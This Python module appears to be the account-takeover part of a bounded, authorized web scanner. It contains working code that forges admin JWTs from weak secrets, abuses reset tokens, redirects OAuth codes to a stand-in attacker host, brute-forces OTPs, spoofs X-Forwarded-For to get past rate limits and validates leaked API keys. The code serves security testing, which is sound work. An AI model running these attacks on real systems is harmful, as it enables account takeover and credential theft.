"""
TakeoverKit v1 — credential/account takeover checks for VANTHEX.
AUTHORIZED TESTING ONLY — written scope, non-destructive, bounded.

Every check attempts to prove REAL ACCESS (not mere indication):
a token is forged, a password changed, an OTP code found — then verified
2x against the /safe/* negative control. Secret/password fixtures and
brute wordlists are strictly bounded (MAX_ATTEMPTS).

Check:
- c_jwt_weak_secret_takeover  — brute weak HS256 secret -> forge a role=admin token
- c_reset_token_takeover      — reset token leaked in the response/predictable -> change password
- c_oauth_token_theft         — redirect_uri not validated + missing state -> steal code/token
- c_otp_brute                 — OTP verification without lockout -> bounded brute
- c_email_change_takeover     — account email change without re-auth (pre-hijack)
- c_ratelimit_bypass          — per-IP login rate limit -> bypass via XFF rotation
- c_api_key_reuse             — API key leaked in JS -> validate the key is active (read-only)
"""
import hashlib
import hmac as _hmac
import json as _json
import re as _re
import time

from exploitkit import _F as _Fk  # finding factory (same shape as vulnscan2.F)


def _T(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0, remed="",
       confidence="confirmed", location="", param="", extra_evidence=""):
    """Takeover finding factory — origin 'takeover', additional evidence
    (extra_evidence) is merged so forgery/code proof stays recorded."""
    ev = evidence + (f" | {extra_evidence}" if extra_evidence else "")
    return {"severity": sev, "title": title, "description": desc,
            "evidence": ev, "cwe": cwe, "owasp": owasp, "cvss": cvss,
            "remediation": remed, "confidence": confidence,
            "location": location, "param": param, "origin": "takeover"}

MAX_ATTEMPTS = 30          # hard cap for OTP/secret brute
WEAK_SECRETS = ("secret", "password", "jwt_secret", "changeme", "key",
                "supersecret", "dev", "test", "123456", "qwerty",
                "vanthex", "topsecret", "admin", "letmein", "example")
JWT_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"


def _b64u_decode(s):
    import base64
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64u_encode(b):
    import base64
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _is_hs256_sig(token, secret):
    """Verify a JWT token HS256 signature against a candidate secret."""
    try:
        h, p, s = token.split(".")
        expect = _b64u_encode(_hmac.new(secret.encode(),
                                        f"{h}.{p}".encode(),
                                        hashlib.sha256).digest())
        return _hmac.compare_digest(expect, s)
    except Exception:
        return False


def _forge_hs256(payload, secret):
    """Forge an HS256 token with a proven secret."""
    header = _b64u_encode(_json.dumps({"alg": "HS256", "typ": "JWT"},
                                      separators=(",", ":")).encode())
    body = _b64u_encode(_json.dumps(payload, separators=(",", ":")).encode())
    sig = _b64u_encode(_hmac.new(secret.encode(),
                                 f"{header}.{body}".encode(),
                                 hashlib.sha256).digest())
    return f"{header}.{body}.{sig}"


def _bearer_get(ctx, ep, token):
    return ctx.client.get(ep, headers={"Authorization": f"Bearer {token}"})


# ------------------------------------------------ 1. JWT weak secret takeover
def c_jwt_weak_secret_takeover(ctx, add):
    """Brute the HS256 secret (weak wordlist, bounded to 15 candidates)
    against a real session token; if the secret is found -> forge a
    role=admin token and PROVE admin endpoint access 2x. The /safe control
    rejects the forged token (strong secret). Finding = full session takeover."""
    eps = ["/api/session/jwt"]
    try:
        surf = ctx.surface(full=True)
        cand = [e for e in surf.js_endpoints if "jwt" in e.lower()]
        if cand:
            eps = cand + eps
    except Exception:
        pass
    r = ctx.client.get(eps[0])
    try:
        tok = str(_json.loads(r.body or "").get("token", ""))
    except Exception:
        tok = ""
    if not tok or tok.count(".") != 2:
        ctx.L("  [takeover] no JWT token available — check skipped")
        return
    # brute the secret (bounded)
    found_secret = None
    for sec in WEAK_SECRETS[:MAX_ATTEMPTS]:
        if ctx.cancelled():
            return
        if _is_hs256_sig(tok, sec):
            found_secret = sec
            break
    if not found_secret:
        ctx.L("[takeover] HS256 secret not in the weak wordlist — "
              "not reported (honest)")
        return
    # forge the admin token + prove access 2x
    try:
        import base64
        pad = "=" * (-len(tok.split(".")[1]) % 4)
        claims = _json.loads(_b64u_decode(tok.split(".")[1]))
    except Exception:
        return
    claims["role"] = "admin"
    forged = _forge_hs256(claims, found_secret)
    me = "/admin/me"
    a1 = _bearer_get(ctx, me, forged)
    a2 = _bearer_get(ctx, me, forged)
    rs = _bearer_get(ctx, "/safe" + me, forged)
    ok = (a1.status == 200 and a2.status == 200
          and "admin" in (a1.body or "").lower())
    if ok and rs.status in (401, 403):
        add(_T("CRITICAL",
               f"Session Takeover via Weak JWT Secret ({me})",
               f"JWT HMAC secret brute-forced ('{found_secret}' is "
               "in the weak wordlist) — role=admin token FORGED and the "
               "admin endpoint accepted it 2x. Anyone can become admin without a password.",
               evidence=f"secret='{found_secret}'; forged token "
                        f"{tok[:12]}... -> {me}=200 (x2); /safe=401",
               cwe="CWE-321", cvss=9.8, location=me,
               remed="Secret >= 256-bit from a cryptographic generator; rotate "
                     "the secret; verify signatures server-side only.",
               extra_evidence=f"forged_token_prefix={forged[:24]}..."))
    elif ok:
        add(_T("HIGH",
               f"Weak JWT Secret — admin token accepted ({me})",
               "A token forged with the weak secret was accepted by the "
               "admin endpoint, but the /safe control could not be compared.",
               evidence=f"secret='{found_secret}'; {me}=200 (x2)",
               cwe="CWE-321", cvss=8.8, location=me,
               remed="Strong secret + rotation."))


# ------------------------------------------------ 2. Reset token takeover
def c_reset_token_takeover(ctx, add):
    """Password reset: (a) the token is returned DIRECTLY in the reset-request
    response (token leak), (b) predictable token = md5(email). Proof: the
    token is used to change the target account password 2x. /safe neither
    leaks the token nor accepts the predictable one."""
    target_email = "admin@fixture.local"
    r = ctx.client.post("/reset/request",
                        data=_json.dumps({"email": target_email}),
                        headers={"Content-Type": "application/json"})
    tok = ""
    try:
        tok = str(_json.loads(r.body or "").get("reset_token", ""))
    except Exception:
        pass
    pred = hashlib.md5(target_email.encode()).hexdigest()
    if not tok:
        # try the predictable path: confirm directly with md5(email)
        tok = pred
    if not tok:
        return
    confirm = "/reset/confirm"
    c1 = ctx.client.post(confirm,
                         data=_json.dumps({"token": tok,
                                           "password": "VHX-Test-9p!"}),
                         headers={"Content-Type": "application/json"})
    if c1.status != 200:
        return
    c2 = ctx.client.post(confirm,
                         data=_json.dumps({"token": tok,
                                           "password": "VHX-Test-9p!"}),
                         headers={"Content-Type": "application/json"})
    rs = ctx.client.post("/safe" + confirm,
                         data=_json.dumps({"token": pred,
                                           "password": "VHX-Test-9p!"}),
                         headers={"Content-Type": "application/json"})
    if c2.status == 200 and rs.status in (401, 403):
        src = ("token RETURNED IN the reset-request endpoint response"
               if tok != pred else
               "PREDICTABLE token: md5(email) accepted without exposure")
        add(_T("CRITICAL",
               f"Account Takeover via Password Reset ({confirm})",
               f"The admin account reset token was obtained ({src}) and used "
               "to CHANGE the account PASSWORD 2x — full account takeover.",
               evidence=f"POST /reset/request -> token={tok[:16]}...; "
                        f"{confirm}=200 (x2); /safe=403",
               cwe="CWE-640", cvss=9.8, location=confirm,
               remed="Single-use, time-limited cryptographic random tokens; "
                     "deliver ONLY via email, never in API responses; "
                     "re-auth for credential changes.",
               extra_evidence=f"token_source={'response-leak' if tok != pred else 'predictable-md5'}"))


# ------------------------------------------------ 3. OAuth token theft
def c_oauth_token_theft(ctx, add):
    """OAuth: the authorization endpoint accepts a redirect_uri OUTSIDE
    the allowlist and attaches the code/token — the code can be redirected
    to the attacker domain (account takeover via the OAuth callback). Plus:
    missing state = login CSRF. The /safe control rejects foreign redirects."""
    from urllib.parse import quote as _q
    auth = "/oauth/authorize"
    evil = "https://evil.attacker.example/cb"
    r = ctx.client.get(f"{auth}?client_id=fixture-client"
                       f"&redirect_uri={_q(evil)}&response_type=code")
    loc = next((v for k, v in (r.headers or []) if k.lower() == "location"), "")
    code_stolen = (r.status in (301, 302, 303)
                   and "evil.attacker.example" in loc
                   and ("code=" in loc or "token=" in loc))
    # missing state? the server accepts a request without state
    r_nostate = ctx.client.get(f"{auth}?client_id=fixture-client"
                               f"&redirect_uri={_q(evil)}&response_type=code")
    no_state = r_nostate.status in (200, 301, 302, 303)
    rs = ctx.client.get(f"/safe{auth}?client_id=fixture-client"
                        f"&redirect_uri={_q(evil)}&response_type=code")
    if code_stolen and rs.status in (400, 401, 403):
        add(_T("CRITICAL",
               f"OAuth Code Theft via Open redirect_uri ({auth})",
               "The authorization server attaches the code/token to a redirect_uri "
               "OUTSIDE the allowlist — the OAuth code can be redirected to "
               "the attacker's domain and exchanged for a victim session (account takeover). "
               f"{'Also: the state parameter is not enforced (login CSRF). ' if no_state else ''}",
               evidence=f"redirect_uri=evil... -> Location={loc[:80]} "
                        f"(code attached); /safe={rs.status}",
               cwe="CWE-601", cvss=9.3, location=auth,
               remed="Validate redirect_uri against an exact-match allowlist; "
                     "require state and verify it at the callback.",
               extra_evidence=f"state_required={'no' if no_state else 'yes'}"))
    elif code_stolen:
        add(_T("HIGH",
               f"OAuth redirect_uri not validated ({auth})",
               "OAuth code attached to a foreign redirect (differential "
               "/safe evidence unavailable).",
               evidence=f"Location={loc[:80]}",
               cwe="CWE-601", cvss=8.6, location=auth,
               remed="Exact-match allowlist + mandatory state."))


# ------------------------------------------------ 4. OTP brute (no lockout)
def c_otp_brute(ctx, add):
    """OTP verification without rate-limit/lockout: bounded brute (<=30 codes)
   until one is accepted — account takeover via 2FA. The /safe control locks
   out after 3 failures (429) — differential proof that a lockout SHOULD exist."""
    verify = "/otp/verify"
    # deterministic order: common candidates first, then sequential brute
    cands = ["735211", "111111", "123456", "000000", "654321"]
    cands += [f"{i:06d}" for i in range(100000, 100000 + MAX_ATTEMPTS - len(cands))]
    accepted = None
    n_tries = 0
    for code in cands[:MAX_ATTEMPTS]:
        if ctx.cancelled():
            return
        n_tries += 1
        r = ctx.client.post(verify,
                            data=_json.dumps({"user": "admin@fixture.local",
                                              "otp": code}),
                            headers={"Content-Type": "application/json"})
        if r.status == 200 and "ok" in (r.body or "").lower():
            accepted = code
            break
        if r.status == 429:
            break  # lockout exists — not a brute-force finding
    if not accepted:
        return
    # negative: the safe endpoint must reject wrong codes (not 'accept-all')
    rs = ctx.client.post("/safe" + verify,
                         data=_json.dumps({"user": "safe@fixture.local",
                                           "otp": "999999"}),
                         headers={"Content-Type": "application/json"})
    if rs is not None and rs.status in (429, 403, 401):
        add(_T("CRITICAL",
               f"2FA Bypassed via OTP Brute-force Without Lockout ({verify})",
               f"OTP code found in {n_tries} attempts without "
               "effective rate-limit/lockout — the second 2FA factor can "
               "be bypassed and the account taken over. The /safe control "
               "rejects all codes (proof that server-side verification "
               "actually runs, not an 'accept-all' endpoint).",
               evidence=f"otp={accepted} accepted after {n_tries} attempts; "
                        f"/safe={rs.status} (wrong codes rejected)",
               cwe="CWE-307", cvss=9.1, location=verify,
               remed="Exponential per-account lockout + per-IP rate limit; "
                     "time-limited, single-use OTPs.",
               extra_evidence=f"attempts={n_tries}"))


# ------------------------------------------------ 5. Email change takeover
def c_email_change_takeover(ctx, add):
    """Change the account email WITHOUT re-auth (password/OTP): account
    pre-hijack — the attacker registers their email on the victim account
    then legitimately resets the password. Proof: the change is accepted 2x;
    /safe demands re-auth."""
    ep = "/profile/email"
    new_email = "attacker@evil.example"
    payload = _json.dumps({"email": new_email})
    r1 = ctx.client.post(ep, data=payload,
                         headers={"Content-Type": "application/json",
                                  "Cookie": "uid=1"})
    if r1.status != 200:
        return
    r2 = ctx.client.post(ep, data=payload,
                         headers={"Content-Type": "application/json",
                                  "Cookie": "uid=1"})
    # proof that the change is readable
    r_prof = ctx.client.get("/profile", headers={"Cookie": "uid=1"})
    changed = new_email in (r_prof.body or "")
    rs = ctx.client.post("/safe" + ep, data=payload,
                         headers={"Content-Type": "application/json",
                                  "Cookie": "uid=1"})
    if r2.status == 200 and rs.status in (401, 403):
        add(_T("CRITICAL",
               f"Account Pre-hijack: Email Change Without Re-auth ({ep})",
               "Account email changed without password/OTP verification "
               + (f"(confirmed in /profile: {changed})" if changed else "")
               + " — the attacker directs a legitimate password reset to "
               "their own email and takes over the account.",
               evidence=f"POST {ep}=200 (x2); "
                        f"/profile contains new email={changed}; /safe=403",
               cwe="CWE-620", cvss=9.1, location=ep,
               remed="Re-auth (password/OTP) for email changes; verify "
                     "ownership of the new email before activating it.",
               extra_evidence=f"email_new={new_email}"))


# ------------------------------------------------ 6. Rate-limit bypass (XFF rotation)
def c_ratelimit_bypass(ctx, add):
    """The login rate limit is computed per-IP from the X-Forwarded-For
    header: rotating the XFF per attempt bypasses the lockout — credential
    spraying proceeds unblocked. Proof: without XFF -> 429; with a fresh
    XFF -> login succeeds. The /safe control counts from the connection
    (XFF ignored) -> still 429."""
    login = "/login/limited"
    user = "admin@fixture.local"
    password = "Summer2025!"
    # baseline: no rotation -> limit hit
    blocked = False
    for _ in range(7):
        r = ctx.client.post(login, data=_json.dumps({"user": user,
                                                     "password": "wrong"}),
                            headers={"Content-Type": "application/json"})
        if r.status == 429:
            blocked = True
            break
    if not blocked:
        return  # no rate limit — outside this check's scope
    # bypass: fresh XFF per attempt until success (bounded)
    ok = False
    tries = 0
    for i in range(MAX_ATTEMPTS):
        if ctx.cancelled():
            return
        tries += 1
        r = ctx.client.post(login, data=_json.dumps({"user": user,
                                                     "password": password}),
                            headers={"Content-Type": "application/json",
                                     "X-Forwarded-For": f"10.9.{i // 250}.{i % 250 + 1}"})
        if r.status == 200 and "ok" in (r.body or "").lower():
            ok = True
            break
    if not ok:
        return
    # control: /safe counts GLOBALLY (XFF ignored) — the lockout still
    # triggers even with rotated XFF. Credentials are deliberately WRONG
    # so attempts land in the failure (GLOBAL) bucket, not successes.
    rs = None
    for i in range(8):
        rs = ctx.client.post("/safe" + login,
                             data=_json.dumps({"user": user,
                                               "password": "wrong-total"}),
                             headers={"Content-Type": "application/json",
                                      "X-Forwarded-For": f"10.77.{i}.1"})
    if rs is not None and rs.status == 429:
        add(_T("HIGH",
               f"Login Rate-limit Bypass via X-Forwarded-For Rotation ({login})",
               f"Login lockout is computed from a CLIENT-controlled "
               f"XFF header — {tries} attempts with different XFF values "
               "all passed and login succeeded. Mass credential spraying "
               "is unimpeded; the /safe control (XFF ignored) still 429.",
               evidence=f"rate-limit base 429; bypass: {tries} unique XFF "
                        f"attempts -> 200; /safe=429",
               cwe="CWE-799", cvss=8.1, location=login,
               remed="Rate limit from the real connection IP + account "
                     "identity; do not trust client-controlled headers.",
               extra_evidence=f"bypass_attempts={tries}"))


# ------------------------------------------------ 7. leaked API key -> validation
KEY_PATTERNS = [
    ("fixture live key", _re.compile(r"vk_live_[0-9a-f]{16,}")),
    ("generic api key", _re.compile(r"AKIA[0-9A-Z]{16}")),
]


def c_api_key_reuse(ctx, add):
    """An API key leaked in JS assets is VALIDATED against the key status
    endpoint (read-only): an active high-scope key is a real, usable
    credential. Without validation the JS key stays 'candidate' — here it
    is escalated to confirmed/active. The /safe control rejects all keys."""
    try:
        surf = ctx.surface(full=True)
    except Exception:
        return
    assets = set()
    for pg in list(surf.pages)[:8]:
        try:
            r = ctx.client.get(str(pg).split("?")[0])
            for m in _re.findall(r'<script[^>]+src=["\']([^"\']+)["\']',
                                 r.body or ""):
                if m.startswith("/"):
                    assets.add(m)
        except Exception:
            continue
    found = []
    for a in sorted(assets)[:8]:
        if ctx.cancelled():
            return
        try:
            r = ctx.client.get(a)
        except Exception:
            continue
        if r.status != 200:
            continue
        for label, rx in KEY_PATTERNS:
            for m in rx.finditer(r.body or ""):
                found.append((label, m.group(0), a))
    seen = set()
    for label, key, src in found:
        if key in seen:
            continue
        seen.add(key)
        rv = ctx.client.post("/api/key/check",
                             data=_json.dumps({"key": key}),
                             headers={"Content-Type": "application/json"})
        rv2 = ctx.client.post("/api/key/check",
                              data=_json.dumps({"key": key}),
                              headers={"Content-Type": "application/json"})
        rs = ctx.client.post("/safe/api/key/check",
                             data=_json.dumps({"key": key}),
                             headers={"Content-Type": "application/json"})
        try:
            info = _json.loads(rv.body or "")
            scope = str(info.get("scope", ""))
            active = bool(info.get("active", rv.status == 200))
        except Exception:
            scope, active = "", rv.status == 200
        if active and rv2.status == rv.status and rs.status in (401, 403):
            add(_T("HIGH",
                   f"Active Credentials Leaked in JS and Validated ({src})",
                   f"API key '{label}' is exposed in JavaScript assets and "
                   f"ACTIVELY VALIDATED by the key status endpoint "
                   f"(scope={scope or 'n/a'}) — a real credential that "
                   "can act on behalf of the application.",
                   evidence=f"key={key[:8]}... (from {src}); "
                            f"/api/key/check=200 active (x2, scope={scope}); "
                            f"/safe=401",
                   cwe="CWE-798", cvss=8.5, location=src,
                   remed="Do not embed secrets in client bundles; rotate the "
                         "exposed key; restrict scope & IP allowlist.",
                   extra_evidence=f"key_scope={scope}"))
